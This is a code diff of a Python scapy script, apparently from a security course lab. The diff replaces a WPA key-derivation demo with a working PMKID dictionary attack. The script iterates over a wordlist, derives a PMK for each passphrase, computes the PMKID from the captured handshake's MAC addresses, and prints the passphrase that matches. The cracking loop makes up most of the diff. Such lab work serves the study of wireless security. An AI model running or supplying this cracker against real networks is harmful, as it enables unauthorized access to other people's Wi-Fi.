@@ -2,7 +2,7 @@
 # -*- coding: utf-8 -*-
 
 """
-Derive WPA keys from Passphrase and 4-way handshake info
+Derive WPA keys from Passphrase and 4-way handshake infomamba
 
 Calcule un MIC d'authentification (le MIC pour la transmission de données
 utilise l'algorithme Michael. Dans ce cas-ci, l'authentification, on utilise
@@ -18,11 +18,12 @@ __status__ 		= "Prototype"
 
 from scapy.all import *
 from binascii import a2b_hex, b2a_hex
-#from pbkdf2 import pbkdf2_hex
+from pbkdf2 import pbkdf2_hex
 from pbkdf2 import *
 from numpy import array_split
 from numpy import array
 import hmac, hashlib
+from tqdm.rich import tqdm
 
 def customPRF512(key,A,B):
     """
@@ -56,53 +57,26 @@ pmkid = wpa[handshake_index].original[-20:-4]
 print("PMKID: ", pmkid)
 
 # Important parameters for key derivation - most of them can be obtained from the pcap file
-passPhrase  = "actuelle"
-A           = "Pairwise key expansion" #this string is used in the pseudo-random function
 ssid = association_request.info.decode("utf-8")
 APmac = a2b_hex(wpa[handshake_index].addr2.replace(":",""))
-Clientmac = a2b_hex(wpa[handshake_index].addr1.replace(":","")) 
+Clientmac = a2b_hex(wpa[handshake_index].addr1.replace(":",""))
 
-# Authenticator and Supplicant Nonces
-ANonce = a2b_hex(wpa[handshake_index].load[13:45].hex())
-SNonce = a2b_hex(wpa[handshake_index + 1].load[13:45].hex()) #Client Nonce
+print ("Reading wordlist...")
+num_lines = sum(1 for line in open('wordlist.txt'))
 
-# This is the MIC contained in the 4th frame of the 4-way handshake
-# When attacking WPA, we would compare it to our own MIC calculated using passphrases from a dictionary
-mic_to_test = wpa[handshake_index + 3].original[-18:-2].hex() # We retrieve the MIC from the 4th frame of the 4-way handshake
+with open('wordlist.txt') as wordlist:
+    print ("Cracking passphrase...")
+    for passphrase in tqdm(wordlist, total=num_lines):
+            PMK = pbkdf2(hashlib.sha1, str.encode(passphrase.replace("\n", "")), ssid.encode(), 4096, 32)
 
-B           = min(APmac,Clientmac)+max(APmac,Clientmac)+min(ANonce,SNonce)+max(ANonce,SNonce) #used in pseudo-random function
+            #convert to bytearray
+            data = b"PMK Name" + APmac + Clientmac
+            PMKID = hmac.new(PMK, data, hashlib.sha1)
 
-data        = wpa[handshake_index + 3].original[48:-18] + b'\0' * 16 + wpa[handshake_index + 3].original[-2:] # We retrieve the data from the payload of the 4th frame of the 4-way handshake without the MIC
+            hexdigest = PMKID.hexdigest()[:-8]
+            pmkidHex = pmkid.hex()
 
-print ("\n\nValues used to derivate keys")
-print ("============================")
-print ("Passphrase: ",passPhrase,"\n")
-print ("SSID: ",ssid,"\n")
-print ("AP Mac: ",b2a_hex(APmac),"\n")
-print ("CLient Mac: ",b2a_hex(Clientmac),"\n")
-print ("AP Nonce: ",b2a_hex(ANonce),"\n")
-print ("Client Nonce: ",b2a_hex(SNonce),"\n")
-
-#calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
-passPhrase = str.encode(passPhrase)
-ssid = str.encode(ssid)
-pmk = pbkdf2(hashlib.sha1,passPhrase, ssid, 4096, 32)
-
-#expand pmk to obtain PTK
-ptk = customPRF512(pmk,str.encode(A),B)
-
-#calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
-mic = hmac.new(ptk[0:16],data,hashlib.sha1)
-
-
-print ("\nResults of the key expansion")
-print ("=============================")
-print ("PMK:\t\t",pmk.hex(),"\n")
-print ("PTK:\t\t",ptk.hex(),"\n")
-print ("KCK:\t\t",ptk[0:16].hex(),"\n")
-print ("KEK:\t\t",ptk[16:32].hex(),"\n")
-print ("TK:\t\t",ptk[32:48].hex(),"\n")
-print ("MICK:\t\t",ptk[48:64].hex(),"\n")
-print ("MIC:\t\t",mic.hexdigest(),"\n")
-print ("MIC to test:\t",mic_to_test,"\n")
+            if pmkidHex == hexdigest:
+                print("FOUND PMK: ", passphrase)
+                break
 
